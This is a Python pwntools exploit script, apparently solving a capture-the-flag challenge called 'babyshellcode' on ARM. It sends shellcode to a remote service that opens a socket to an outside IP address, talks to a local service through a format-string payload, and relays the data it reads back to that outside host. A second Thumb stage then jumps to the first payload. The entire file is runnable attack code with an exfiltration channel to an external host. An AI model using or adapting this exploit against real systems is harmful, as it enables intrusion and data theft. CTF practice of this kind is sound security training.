from pwn import *

while True:
    if (sys.argv[1] == "debug"):
        r = process(argv=["qemu-arm","-g","3000","./babyshellcode"])
    elif (sys.argv[1] == "local"):
        r = process("./babyshellcode")
    else:
        r = remote("212.47.229.147", 9999)

    #pause()
    context.arch = "arm"
    r.recvuntil("Your secret: ")
    shellcode_asm = shellcraft.arm.linux.connect("206.189.148.40", 2225) 
    shellcode_asm += "mov r9, r6;"
    shellcode_asm += shellcraft.arm.linux.connect("127.0.0.1", 8888)
    shellcode_asm += "mov r8, r6;"
    shellcode_asm += "adr r2, filepath_6"
    shellcode_asm += shellcraft.arm.linux.syscall('SYS_write','r8','r2',20)
    shellcode_asm += "b after_6;"
    shellcode_asm += '''filepath_6: .byte 0x25, 0x33, 0x34, 0x24, 0x70, 0x25, 0x31, 0x31, 0x24, 0x70, 0x25, 0x70, 0x25, 0x70, 0x25, 0x70, 0, 0, 0, 0
    after_6:'''
    shellcode_asm += shellcraft.arm.linux.syscall('SYS_read','r8','sp',100)
    shellcode_asm += "add r2, sp, #0x21;"
    shellcode_asm += "ldr r0, [r2];"
    shellcode_asm += "ldr r1, [r2, #4];"

    #%5$n
    shellcode_asm += shellcraft.arm.mov('r3', 0x73243625)
    shellcode_asm += "push {r3};"

    shellcode_asm += "mov r3, r0;"
    shellcode_asm += "and r3, #0xff;"
    shellcode_asm += "sub r3, #0x30;"
    shellcode_asm += "lsl r3, r3, #4;"

    shellcode_asm += "lsr r4, r0, #8;"
    shellcode_asm += "and r4, #0xff;"
    shellcode_asm += "sub r4, #0x30;"
    shellcode_asm += "add r4, r3;"
    shellcode_asm += "lsl r4, r4, #8;"

    shellcode_asm += "lsr r3, r0, #16;"
    shellcode_asm += "and r3, #0xff;"
    shellcode_asm += "sub r3, #0x30;"
    shellcode_asm += "lsl r3, r3, #4;"

    shellcode_asm += "lsr r5, r0, #24;"
    shellcode_asm += "and r5, #0xff;"
    shellcode_asm += "sub r5, #0x30;"
    shellcode_asm += "add r5, r3;"
    shellcode_asm += "add r4, r5;"
    shellcode_asm += "lsl r4, r4, #8;"

    shellcode_asm += "mov r3, r1;"
    shellcode_asm += "and r3, #0xff;"
    shellcode_asm += "sub r3, #0x30;"
    shellcode_asm += "lsl r3, r3, #4;"

    shellcode_asm += "lsr r5, r1, #8;"
    shellcode_asm += "and r5, #0xff;"
    shellcode_asm += "sub r5, #0x30;"
    shellcode_asm += "add r5, r3;"
    shellcode_asm += "add r4, r5;"
    
    shellcode_asm += shellcraft.arm.mov('r5', 67575)
    shellcode_asm += "add r4, r5;"
    shellcode_asm += "str r4, [sp, #4];"

    shellcode_asm += shellcraft.arm.linux.syscall('SYS_write','r8','sp',8)
    shellcode_asm += shellcraft.arm.linux.syscall('SYS_read','r8','sp',500)

    shellcode_asm += "mov r0, r9;"
    shellcode_asm += shellcraft.arm.linux.syscall('SYS_write','r0','sp',500)

    #print shellcode_asm
    shellcode = asm(shellcode_asm)
    r.send(shellcode)

    r.recvuntil("Small leak: ")
    shellcode_addr = int(r.recvline().strip(),16) + 0x7000
    log.info("shellcode_addr: %s" % hex(shellcode_addr))
    r.recvuntil("Your shellcode: ")

    context.arch = "thumb"
    shellcode_asm = shellcraft.thumb.mov('r1', shellcode_addr)
    shellcode_asm += "bx r1"

    shellcode = asm(shellcode_asm)
    r.send(shellcode)

    r.close()
    sleep(1)
    #r.interactive()
